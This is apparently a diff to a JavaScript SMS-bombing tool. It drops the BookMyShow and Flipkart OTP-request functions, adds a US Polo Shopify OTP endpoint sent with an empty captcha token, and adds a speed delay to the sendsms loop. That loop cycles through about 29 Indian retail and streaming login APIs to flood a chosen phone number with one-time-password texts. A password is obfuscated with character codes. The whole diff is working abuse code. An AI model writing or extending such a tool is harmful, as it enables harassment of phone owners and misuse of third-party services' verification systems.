@@ -1,3 +1,6 @@
+let fs = require("fs")
+
+
 function hash(data) {
     var password = String.fromCharCode(109, 121, 119, 97, 108, 108, 101, 116, 108, 121, 45, 111, 112, 115, 117, 107, 114, 97, 116);
     let encryptedData = "";
@@ -279,30 +282,6 @@ async function ajio(number) {
                     resolve(false)
                 })
             }
-        })
-    })
-}
-
-async function bookmyshow(number) {
-    return new Promise((resolve) => {
-        fetch("https://in.bookmyshow.com/api/members/otp/send", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-                "User-Agent": "PostmanRuntime/7.41.2"
-            },
-            body: JSON.stringify({
-                "channel": "phone",
-                "subChannel": "sms",
-                "details": {
-                    "phone": number,
-                    "origin": "https://in.bookmyshow.com"
-                }
-            })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
-            if (data?.statusCode === 200)
-                resolve(true)
-            resolve(false)
         })
     })
 }
@@ -609,23 +588,6 @@ async function fancode(number) {
 
 }
 
-async function flipkart(number) {
-    return new Promise((resolve) => {
-        fetch("https://1.rome.api.flipkart.com/api/7/user/otp/generate", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-                "X-User-Agent": " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 FKUA/website/42/website/Desktop"
-            },
-            body: JSON.stringify({ "loginId": "+91" + number })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
-            if (data?.RESPONSE.requestId)
-                resolve(true)
-            resolve(false)
-        })
-    })
-}
-
 async function gamezone(number) {
     return new Promise((resolve) => {
         fetch("https://api.dotshowroom.in/api/dotk/vo1/user/login/" + number + "?source=digital_showroom&domain=https://www.digitalgamezone.co.in/orders")
@@ -745,14 +707,49 @@ async function derma(number) {
     })
 }
 
-async function sendsms(number, ws, limit) {
-    let list = [ajio, blinkit, bookmyshow, byjus, croma, derma, eatclub, fancode, fantv, flipkart, gamezone, hoichoi, housing, infinitylearn, jar, jiocinema, kukufm, medibuddy, mamaearth, meesho, momsco, my11circle, mywallety, netmeds, probo, tradex, unacademy, zee5, zomato, nxtwave]
-    let i = 0, t = 0;
+
+async function uspolo(number) {
+    return new Promise((resolve) => {
+        fetch("https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "shop_name": "u-s-polo-assn-india.myshopify.com",
+                "action": "sendOTP"
+            },
+            body: JSON.stringify({
+                "username": "+91" + number,
+                "type": "mobile",
+                "domain": "uspoloassn.in",
+                "recaptcha_token": ""
+            })
+        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+            if (data?.message === "OTP sent successfully!")
+                resolve(true)
+            resolve(false)
+        })
+    })
+}
+
+function sleep(time){
+    let now = new Date().getTime();
+    for(let i=0; i<1e7 ;i++){
+        if(new Date().getTime() - now >= time) 
+            break;
+    }
+
+}
+
+async function sendsms(number, ws, limit, speed) {
+    speed = parseInt(speed)
+    let list = [ajio, blinkit, byjus, croma, derma, eatclub, fancode, fantv, gamezone, hoichoi, housing, infinitylearn, jar, jiocinema, kukufm, medibuddy, mamaearth, meesho, momsco, my11circle, mywallety, netmeds, probo, tradex, unacademy, uspolo, zee5, zomato, nxtwave]
+    let i = 0,t=0;
     while (i < limit) {
-        let res = await list[t % 30](number)
+        let res = await list[t%29](number)
         if (res) {
             i++;
             ws.send("1")
+            sleep(speed)
         }
         t++;
     }
